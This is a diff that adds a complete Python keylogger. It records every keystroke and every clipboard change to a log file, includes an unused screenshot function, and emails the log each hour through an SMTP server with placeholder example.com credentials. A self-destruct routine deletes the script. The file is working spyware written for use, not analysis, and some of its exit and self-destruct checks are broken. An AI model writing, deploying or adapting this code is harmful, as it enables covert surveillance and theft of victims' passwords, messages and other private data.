@@ -1,0 +1,127 @@
+import os
+import smtplib
+import logging
+import pyautogui
+import clipboard
+from pynput.keyboard import Key, Listener
+from datetime import datetime
+import threading
+import time
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+# Basic log configuration
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s.%(msecs)03d [%(threadName)-12s] - %(message)s")
+
+# Email configuration
+SMTP_SERVER = "smtp.example.com"
+SMTP_PORT = 587
+EMAIL_ADDRESS = "your_email@example.com"
+EMAIL_PASSWORD = "your_email_password"
+TO_EMAIL = "recipient@example.com"
+
+# Function to send logs via email
+def send_logs_via_email():
+    while True:
+        try:
+            # Read log file
+            with open("keylog.txt", "r") as f:
+                log_content = f.read()
+
+            # Check if there are new logs
+            if log_content != "":
+                # Create email message
+                msg = MIMEMultipart()
+                msg["From"] = EMAIL_ADDRESS
+                msg["To"] = TO_EMAIL
+                msg["Subject"] = "Keylogger Logs"
+                msg.attach(MIMEText(log_content, "plain"))
+
+                # Send email
+                server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+                server.starttls()
+                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+                text = msg.as_string()
+                server.sendmail(EMAIL_ADDRESS, TO_EMAIL, text)
+                server.quit()
+
+        except Exception as e:
+            print(f"Error sending logs via email: {e}")
+
+        finally:
+            # Wait for 1 hour before sending logs again
+            time.sleep(3600)
+
+# Function to handle key presses
+def on_press(key):
+    try:
+        # Capture timestamp
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        key_str = str(key)
+
+        # Handle special keys
+        if key == Key.space:
+            key_str = " "
+        elif key == Key.enter:
+            key_str = "\n"
+        elif key == Key.backspace:
+            key_str = "[BACKSPACE]"
+
+        # Log keystrokes
+        logging.info(f"{timestamp} - {key_str}")
+
+        # Check for self-destruct condition (e.g., specific key combination)
+        if key_str.lower() == "selfdestruct":
+            self_destruct()
+
+        # Check for exit condition (e.g., specific key combination)
+        elif key_str.lower() == "exit":
+            return False
+
+    except AttributeError:
+        pass
+
+# Function to monitor clipboard changes
+def monitor_clipboard():
+    last_clipboard = clipboard.paste()
+    while True:
+        current_clipboard = clipboard.paste()
+        if current_clipboard != last_clipboard:
+            logging.info(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}.000 [ClipboardMonitor] - [CLIPBOARD] {current_clipboard}")
+            last_clipboard = current_clipboard
+            time.sleep(1)
+
+# Function to capture screenshots
+def capture_screenshot():
+    screenshot_dir = "screenshots"
+    os.makedirs(screenshot_dir, exist_ok=True)
+    screenshot_name = f"{screenshot_dir}/{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+    pyautogui.screenshot(screenshot_name)
+    print(f"Screenshot saved: {screenshot_name}")
+
+# Self-destruct function
+def self_destruct():
+    try:
+        if not hasattr(self_destruct, "called"):
+            self_destruct.called = True
+            # Delete keylogger script
+            os.remove(__file__)
+
+            # Stop sending logs via email
+            global send_logs_email_thread
+            send_logs_email_thread.join()
+
+    except Exception as e:
+        print(f"Error during self-destruct: {e}")
+
+# Start email thread
+send_logs_email_thread = threading.Thread(target=send_logs_via_email)
+send_logs_email_thread.start()
+
+# Start clipboard monitoring thread
+clipboard_thread = threading.Thread(target=monitor_clipboard)
+clipboard_thread.start()
+
+# Start keylogger listener
+with Listener(on_press=on_press) as listener:
+    listener.join()
